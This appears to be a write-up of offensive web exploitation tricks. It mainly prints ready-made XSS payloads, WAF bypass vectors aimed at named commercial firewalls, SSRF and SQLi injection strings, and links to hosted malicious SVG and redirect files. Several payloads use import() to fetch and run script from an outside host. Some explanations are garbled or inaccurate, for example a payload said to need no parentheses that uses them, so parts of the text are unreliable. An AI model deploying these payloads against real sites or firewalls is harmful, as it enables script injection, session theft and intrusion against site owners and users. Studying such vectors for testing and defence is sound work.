<h1>Brute Logic Tricks: Advanced Techniques in Web Security Exploitation</h1>
The following write-up highlights advanced web exploitation techniques focusing on XSS (Cross-Site Scripting) vulnerabilities, WAF (Web Application Firewall) bypasses, and SSRF (Server-Side Request Forgery) scenarios. These methods are tailored for skilled penetration testers and security researchers, offering a deeper understanding of how to trick filters and evade detection in web applications.

1. Escaping Filters Using Byte Bundles
Concept: To bypass filters that escape specific characters such as single quotes (') when performing web attacks, particularly XSS, one can leverage bytes in the range of %A1 to %FE. These byte ranges can be combined with a single quote to outsmart the filter mechanism.

Explanation: In web security, many systems sanitize or escape certain characters like %27 (which is the ASCII encoding for ') to prevent malicious injections. However, some filtering mechanisms do not account for all possible byte combinations. By using a byte from %A1 to %FE, you can evade certain character escape sequences and trick the filter into allowing the injection. This is particularly useful when performing brute-force logic attacks or exploring other injection techniques.

2. WP 6.0 XSS to RCE Proof of Concept (PoC)
Concept: In WordPress 6.0, a known exploit allows a user to escalate an XSS (Cross-Site Scripting) vulnerability to RCE (Remote Code Execution). The method involves creating a file (brute.txt) in the /wp-content/plugins folder.

Example:

import('//X55.is/wp')
Requirements:

An admin user must be logged in with default write permissions.
The "Hello Dolly" plugin needs to be activated (or left deactivated as it's a default plugin in WordPress).
Explanation: XSS is a client-side code injection attack, but in this case, it can escalate into a server-side RCE if the admin user is logged in. The trick lies in leveraging the default permissions in WordPress installations to inject a malicious file. This kind of exploitation showcases the danger of poorly protected administrative interfaces in web applications.

3. Breaking Out of String Values with Quotes
Concept: To escape from any string value where user input is embedded, an injection of single or double quotes is essential unless there are two injection points.

Example:
XSS: /alert(1)//\
Explanation: When user inputs are inserted into strings without proper sanitization, attackers can use single or double quotes to close the string and execute arbitrary code. However, if you have two injection points (such as opening and closing quotes around your payload), breaking out of a single point might not be necessary. The goal here is to manipulate the syntax of the code by closing strings prematurely, enabling the injection of additional malicious code.

4. Anchors as XSS Vectors
Concept: HTML <a> tags (anchors) are powerful XSS vectors. By exploiting their attributes, one can trigger XSS payloads automatically.

Example 1:
<a href=//X55.is autofocus onfocus=import(href)>
Explanation: Here, the combination of the autofocus and onfocus attributes is used to trigger the import() function when the link is clicked or the element receives focus. This is an advanced method for exploiting XSS, taking advantage of HTML5 attributes. The anchor tag makes it especially dangerous since it is a common element on web pages and can be used to load external scripts without the need for parentheses.

5. Misplacing Payloads and the ">" Symbol
Concept: If a payload and the ">" symbol are misplaced in HTML code, moving elements out of their usual place can still allow the execution of malicious code.

Example:
<Img Src="//X55.is/> "OnError=import(src)//
Explanation: In this example, the payload bypasses filters by misplacing the > symbol. This is a clever trick that can allow a malicious script to run even if the filter expects the payload to be in a specific position. The OnError event is used to trigger the payload when the image fails to load, effectively executing the malicious code.

6. Securi WAF Bypass
Concept: Securi WAF (Web Application Firewall) can be bypassed using a crafted HTML form, as shown below.

Example:

data:text/html,<form action=https://brutelogic.com.br/xss-waf.php method=post><input type=hidden name=a value="<K Contenteditable Autofocus OnFocusIn= [1].map(alert)>"><input type=submit value=XSS></form>
Explanation: This example uses a hidden input field with a crafted payload to bypass the Securi WAF. The Contenteditable attribute allows for user interaction, while Autofocus and OnFocusIn trigger the attack when the form is submitted. Web Application Firewalls typically inspect requests for known patterns, but this creative form submission method can evade such detection mechanisms.

7. Impera WAF Bypass
Concept: By crafting a vector inside an SVG tag, it’s possible to bypass the Impera WAF.

Example:

<svg><set onbegin=d=document,b='`',d['loca'+'tion']='javascript&colon;aler'+'t'+b+domain+b>
Explanation: Here, the vector uses an SVG element with a set attribute that starts executing JavaScript code when the SVG is rendered. The code concatenates parts of the location object and JavaScript's alert() function to trigger an alert. This bypasses the Impera WAF, which likely doesn’t properly inspect or decode these complex constructs inside SVG files.

8. XSS Vulnerability from SSRF or SQLi Scenarios
Concept: Cross-Site Scripting (XSS) can emerge from SSRF (Server-Side Request Forgery) or SQL injection scenarios if improperly handled.

SSRF (curl-based) Example:

?url=https://blablablabla-site.com/poc.svg
SSRF (PHP file_get_contents) Example:

plaintext
Copy code
?url=data:,<svg/onload=alert(1)>
SQLi (error-based) Example:

?id='<svg/onload=alert(1)>
Explanation: In these cases, XSS occurs because input parameters are not sanitized, allowing attackers to inject malicious scripts into server responses. SSRF exploits can be leveraged by providing URLs that return SVG files containing scripts, while SQLi can inject scripts directly into database queries, resulting in the execution of malicious code when the error message or query result is rendered.

9. Brute SVG Collection
Brute Logic offers a collection of SVG files, each serving different purposes in exploiting web vulnerabilities.

XSS (no image)

URL: https://brutelogic.com.br/poc.svg
XSS (valid image)

URL: https://brutelogic.com.br/brute.svg
Redirect (default)

URL: https://brutelogic.com.br/redir.svg
Redirect (custom)

URL: https://brutelogic.com.br/redir.svg?url=//X55.is
Redirect (custom + warning)

URL: https://brutelogic.com.br/redir.svg?url=//X55.is&w=1
Explanation: This collection provides pre-built SVG files that trigger XSS or redirect behavior when accessed. The SVG format is commonly used for image rendering, but attackers can insert scripts into these files, making them a vector for XSS attacks. The redirect files can be customized to send users to any malicious site, with optional warning messages to obscure the true intent of the redirect.

Conclusion
The above techniques represent advanced strategies used by security researchers to test, bypass, and exploit web vulnerabilities. These methods emphasize the need for rigorous input validation, secure configuration, and proper use of web application firewalls to protect against common attack vectors like XSS, SSRF, and SQLi. As web security continues to evolve, so do the methods used by attackers, making it crucial to stay informed about these cutting-edge techniques.

